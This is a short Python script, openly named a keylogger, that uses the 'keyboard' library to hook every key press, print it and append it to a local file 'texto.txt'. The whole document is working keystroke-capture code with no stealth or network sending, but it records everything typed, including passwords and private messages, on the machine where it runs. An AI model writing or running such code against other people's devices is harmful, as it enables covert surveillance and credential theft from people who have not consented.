import keyboard

def keylogger(key): 
    print(key.name)
    
    with open('texto.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(keylogger)
keyboard.wait()